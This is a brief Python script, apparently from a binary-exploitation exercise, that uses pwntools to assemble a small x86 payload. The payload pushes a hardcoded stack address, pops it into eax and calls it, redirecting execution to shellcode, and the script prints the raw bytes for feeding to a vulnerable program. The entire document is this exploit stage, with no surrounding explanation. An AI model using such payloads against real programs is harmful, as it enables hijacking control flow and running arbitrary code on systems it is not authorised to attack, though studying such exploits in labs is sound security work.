import sys
from pwn import *

shellcode_address = 0xffffd54a

payload = (
    b'\x68' # push shellcode_address
    + p32(shellcode_address) # shellcode address, in little endian order 
    + b"\x58"  # pop eax
    + b'\xff\xd0' # call eax
)

sys.stdout.buffer.write(payload)
